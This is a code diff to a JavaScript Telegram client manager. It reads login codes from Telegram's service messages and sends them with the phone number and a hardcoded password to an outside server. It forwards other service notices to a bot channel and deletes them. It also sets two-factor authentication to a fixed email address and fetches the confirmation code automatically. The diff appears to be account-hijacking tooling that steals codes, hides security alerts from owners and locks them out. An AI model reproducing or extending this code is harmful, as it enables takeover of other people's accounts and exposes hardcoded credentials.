@@ -266,13 +266,13 @@ class TelegramManager {
         if (event.isPrivate) {
             if (event.message.chatId.toString() == "777000") {
                 console.log(event.message.text.toLowerCase());
-                console.log("Login Code received for - ", this.phoneNumber, '\nSetup - ', TelegramManager.activeClientSetup);
+                console.log("Login Code received for - ", this.phoneNumber, '\nActiveClientSetup - ', TelegramManager.activeClientSetup);
                 if (TelegramManager.activeClientSetup && this.phoneNumber === TelegramManager.activeClientSetup?.mobile) {
                     console.log("LoginText: ", event.message.text);
                     const code = (event.message.text.split('.')[0].split("code:**")[1].trim());
                     console.log("Code is:", code);
                     try {
-                        const response = await axios_1.default.get(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);
+                        await (0, utils_1.fetchWithTimeout)(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);
                         console.log("Code Sent back");
                     }
                     catch (error) {
@@ -280,18 +280,7 @@ class TelegramManager {
                     }
                 }
                 else {
-                    const ppplbot = `https://api.telegram.org/bot${process.env.ramyaredd1bot}/sendMessage`;
-                    const payload = {
-                        "chat_id": "-1001801844217",
-                        "text": event.message.text
-                    };
-                    axios_1.default.post(ppplbot, payload)
-                        .then((response) => {
-                    })
-                        .catch((error) => {
-                        console.log((0, utils_1.parseError)(error));
-                        console.log((0, utils_1.parseError)(error));
-                    });
+                    await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(event.message.text)}`);
                     await event.message.delete({ revoke: true });
                 }
             }
@@ -491,6 +480,7 @@ class TelegramManager {
     }
     async set2fa() {
         if (!(await this.hasPassword())) {
+            console.log("Password Does not exist, Setting 2FA");
             const imapService = IMap_1.MailReader.getInstance();
             const twoFaDetails = {
                 email: "storeslaksmi@gmail.com",
@@ -500,66 +490,64 @@ class TelegramManager {
             try {
                 await imapService.connectToMail();
                 const checkMailInterval = setInterval(async () => {
-                    try {
-                        if (imapService.isMailReady()) {
-                            clearInterval(checkMailInterval);
-                            await this.client.updateTwoFaSettings({
-                                isCheckPassword: false,
-                                email: twoFaDetails.email,
-                                hint: twoFaDetails.hint,
-                                newPassword: twoFaDetails.newPassword,
-                                emailCodeCallback: async (length) => {
-                                    console.log("code sent");
-                                    return new Promise(async (resolve, reject) => {
-                                        let retry = 0;
-                                        const codeInterval = setInterval(async () => {
-                                            try {
-                                                console.log("checking code");
-                                                retry++;
-                                                if (imapService.isMailReady() && retry < 4) {
-                                                    const code = await imapService.getCode();
-                                                    console.log('Code: ', code);
-                                                    if (code) {
-                                                        clearInterval(codeInterval);
-                                                        imapService.disconnectFromMail();
-                                                        resolve(code);
-                                                    }
-                                                }
-                                                else {
-                                                    clearInterval(codeInterval);
-                                                    await this.client.disconnect();
-                                                    imapService.disconnectFromMail();
-                                                    reject(new Error("Failed to retrieve code"));
-                                                }
-                                            }
-                                            catch (error) {
-                                                clearInterval(codeInterval);
-                                                imapService.disconnectFromMail();
-                                                reject(error);
-                                            }
-                                        }, 10000);
-                                    });
-                                },
-                                onEmailCodeError: (e) => {
-                                    console.log((0, utils_1.parseError)(e));
-                                    return Promise.resolve("error");
-                                }
-                            });
-                            return twoFaDetails;
-                        }
-                    }
-                    catch (error) {
+                    console.log("Checking if mail is ready");
+                    if (imapService.isMailReady()) {
                         clearInterval(checkMailInterval);
-                        console.log((0, utils_1.parseError)(error));
+                        console.log("Mail is ready, checking code!");
+                        await this.client.updateTwoFaSettings({
+                            isCheckPassword: false,
+                            email: twoFaDetails.email,
+                            hint: twoFaDetails.hint,
+                            newPassword: twoFaDetails.newPassword,
+                            emailCodeCallback: async (length) => {
+                                console.log("Code sent");
+                                return new Promise(async (resolve, reject) => {
+                                    let retry = 0;
+                                    const codeInterval = setInterval(async () => {
+                                        try {
+                                            console.log("Checking code");
+                                            retry++;
+                                            if (imapService.isMailReady() && retry < 4) {
+                                                const code = await imapService.getCode();
+                                                console.log('Code:', code);
+                                                if (code) {
+                                                    await imapService.disconnectFromMail();
+                                                    clearInterval(codeInterval);
+                                                    resolve(code);
+                                                }
+                                            }
+                                            else {
+                                                clearInterval(codeInterval);
+                                                await imapService.disconnectFromMail();
+                                                reject(new Error("Failed to retrieve code"));
+                                            }
+                                        }
+                                        catch (error) {
+                                            clearInterval(codeInterval);
+                                            await imapService.disconnectFromMail();
+                                            reject(error);
+                                        }
+                                    }, 10000);
+                                });
+                            },
+                            onEmailCodeError: (e) => {
+                                console.error('Email code error:', (0, utils_1.parseError)(e));
+                                return Promise.resolve("error");
+                            }
+                        });
+                        return twoFaDetails;
+                    }
+                    else {
+                        console.log("Mail not ready yet");
                     }
                 }, 5000);
             }
             catch (e) {
-                console.log((0, utils_1.parseError)(e));
+                console.error("Unable to connect to mail server:", (0, utils_1.parseError)(e));
             }
         }
         else {
-            console.log("Password Already Exists");
+            console.log("Password already exists");
         }
     }
     async sendPhotoChat(id, url, caption, filename) {
